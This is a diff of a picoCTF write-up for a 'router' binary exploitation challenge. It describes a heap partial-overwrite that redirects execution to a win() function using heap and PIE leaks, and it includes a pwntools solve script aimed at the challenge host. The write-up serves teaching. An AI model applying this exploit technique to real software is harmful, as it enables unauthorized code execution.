@@ -168,7 +168,7 @@ Type "help", "copyright", "credits" or "license" for more information.
 20608
 ```
 
-If we align heap_idx so that it starts the write exactly at the start of the ORD array, we will overwrite the (\*uint) dst_x field (last 4 bytes of the write) with the new_cost value that we fully control. But what do we set new_cost to? Well we want this expression: order->dst_y * G.width + order->dst_x to evaluate to the 4 least significant bytes of the win address. So, let's recall basic algebra and solve for the value of dst_x. Assuming we use *add_order 1 1* as our first order. The value of dst_y will be 1 (unchanged) and the value of G.width will be 16 which is the default width because the program loads the city1 map by default. The 32 lsb bits for the win() address will be calculated at runtime using the PIE base. It's important to note, when entering the new_cost value, it is read as a *signed* integer, which means it can be negative, and it will be converted to the appropriate *unsigned* integer on implicit cast into the dst_x field.
+If we align heap_idx so that it starts the write exactly at the start of the ORD array, we will overwrite the (\*uint) dst_x field (last 4 bytes of the write) with the new_cost value that we fully control. But what do we set new_cost to? Well we want this expression: order->dst_y * G.width + order->dst_x to evaluate to the 4 least significant bytes of the win address. So, let's recall basic algebra and solve for the value of dst_x. Assuming we use *add_order 1 1* as our first order. The value of dst_y will be 1 (unchanged) and the value of G.width will be 16 which is the default width because the program loads the city1 map by default. The 32 least significant bits for the win() address will be calculated at runtime using the PIE base. It's important to note, when entering the new_cost value, it is read as a *signed* integer, which means it can be negative, and it will be converted to the appropriate *unsigned* integer on implicit cast into the dst_x field.
 
 dst_x = s32(32_lsb_win - 16)
 
@@ -180,7 +180,7 @@ iVar25 = (int)uVar17;
 piVar21 = (int *)(lVar30 + (long)iVar25 * 8);
 ```
 
-As shown in this code snippet, we are accessing the value 8 bytes from the start of the order's heap structure (which holds the address of the start of the entries list in the heap structure), and dereferencing the value there; the value is 0x18. This was found by analyzing the heap structure in memory with GDB.
+As shown in this code snippet, we are accessing the value 8 bytes from the start of the order's heap structure and dereferencing the value there; this value is the start of the entries list in the heap structure. So, from our heap leak, we can calculate the offset of the start of the entries list by subtracting the heap leak from the address stored at offset 8. Doing this calculation, a value of 0x18 was obtained as shown below.
 
 ```
 0x555977300b90: 0x00000080      0x00000003      0x77300ba8      0x00005559
@@ -210,7 +210,7 @@ Ok that was a lot! Now most of the work is done.
 
 # Implementing the Overwrite
 
-So, we have the heap_idx to corrupt the write location, and the new_cost to corrupt the write value. One more thing we have to account for is the order ID field being changed. Since we only have a partial-write primitive, the first four bytes written (aka the ID field) will be determined by order->dst_y * G.width + order->dst_x. For the first write, this will be 1 * 16 + 1 or just 17, assuming the first order we add will be *add_order* 1 1. When trying to reference the order, we can't use ID 0 anymore, we will have to use ID 17 because when we overwrote dst_x, we also overwrote the order ID field to 17.
+So, we have the heap_idx to corrupt the write location, and the new_cost to corrupt the write value. One more thing we have to account for is the order ID field being changed. Since we only have a partial-write primitive, the first four bytes written (aka the ID field) will be determined by order->dst_y * G.width + order->dst_x. For the first write, this will be 1 * 16 + 1 or just 17, assuming the first order we add will be *add_order 1 1*. When trying to reference the order, we can't use ID 0 anymore, we will have to use ID 17 because when we overwrote dst_x, we also overwrote the order ID field to 17.
 
 The chain for the dst_x overwrite to change the first 4 bytes of the next reroute operation on the same order is:
 
@@ -241,26 +241,23 @@ dispatch 17
 # Solve Script
 
 ```
-#!/usr/bin/env python3
 import re
 from pwn import *
 # helper functions written with AI to save time
 
 context.log_level = "debug"
-HOST = "mysterious-sea.picoctf.net" # enter remote host here
-PORT = 55435 # enter remote port here
-PROMPT = b"router> "
-elf = ELF("./router", checksec=False)
+host = "mysterious-sea.picoctf.net" # enter remote host here
+port = 55435 # enter remote port here
+prompt = b"router> "
+elf = ELF("router")
 
 def cmd(io, line):
     io.sendline(line.encode())
-    return io.recvuntil(PROMPT).decode("latin1", "replace")
+    return io.recvuntil(prompt).decode("latin1", "replace")
 # used to send a line of input and recieve the results of the operation
 
 def leak(text, name):
     match = re.search(rf"{name}=(0x[0-9a-fA-F]+)", text)
-    if not match:
-        raise RuntimeError(f"missing {name} leak")
     return int(match.group(1), 16)
 # used to get the heap and PIE leaks
 
@@ -270,8 +267,8 @@ def s32(x):
 # used to convert an unsigned integer into a signed integer
 
 def main():
-    io = remote(HOST, PORT)
-    io.recvuntil(PROMPT)
+    io = remote(host, port)
+    io.recvuntil(prompt)
     cmd(io, "add_order 1 1") # add initial order with x and y as 1
     heap_struct_base = leak(cmd(io, "receipt 0"), "hint") # leak heap address
     fx_draw_basic = leak(cmd(io, "replay 0"), "renderer") # leak PIE address
@@ -287,8 +284,7 @@ def main():
     print(dispatch)
     io.interactive()
 
-if __name__ == "__main__":
-    main()
+main()
 ```
 
 # Final Thoughts
